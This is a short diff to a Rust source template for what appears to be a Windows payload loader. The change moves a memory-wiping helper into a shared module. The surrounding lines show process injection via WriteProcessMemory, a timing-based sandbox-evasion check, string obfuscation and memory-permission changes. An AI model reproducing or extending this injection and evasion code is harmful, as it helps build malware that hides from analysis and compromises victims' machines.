@@ -2,6 +2,7 @@
 #![allow(non_snake_case)]
 
 {{LITCRYPT_SETUP}}
+{{COMMON_MODULE}}
 
 use sysinfo::System;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
@@ -43,12 +44,6 @@ fn check_environment() -> bool {
     start.elapsed().as_millis() >= 2500
 }
 
-fn wipe(buf: &mut Vec<u8>) {
-    for b in buf.iter_mut() {
-        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
-    }
-    buf.clear();
-}
 
 fn enhance(mut buf: Vec<u8>, tar: usize) {
     unsafe {
@@ -73,7 +68,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
             Some(&mut byteswritten),
         );
 
-        wipe(&mut buf);
+        common::wipe(&mut buf);
         pause(150);
 
         let mut old_perms = PAGE_READWRITE;
